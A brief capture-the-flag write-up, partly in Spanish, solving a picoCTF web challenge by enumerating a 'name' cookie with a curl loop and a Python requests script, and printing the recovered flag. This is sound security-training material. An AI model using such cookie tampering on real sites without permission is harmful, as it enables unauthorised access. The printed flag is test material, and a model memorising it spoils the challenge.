#### Description

Who doesn't love cookies? Try to figure out the best one. http://wily-courier.picoctf.net:58622/

La primera solucion es usando curl

```
adrian@ThW:~/Downloads$ for i in {1..30}; do curl -s http://wily-courier.picoctf.net:58622/check -H "Cookie: name=$i"; done | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}

```

La segunda opcion es usando un script de python

```
import requests # libreria para realizar peticiones
import re # libreria para expresiones regulares

url = "url_cambia"
for i in range(20):
        cookie = {'name':'{}'.format(i)} # crea la cookie
        r = requests.get(url, cookies=cookie) # hace la peticion con la cookie modificada
        if 'pico' in r.text:
                flag = re.findall('picoCTF{.*?}',r.text)[0] # substrae la bandera de la respuesta
                print(flag)
```

Probar el script 

```
adrian@ThW:~/Downloads$ python script.py
picoCTF{.....}
```
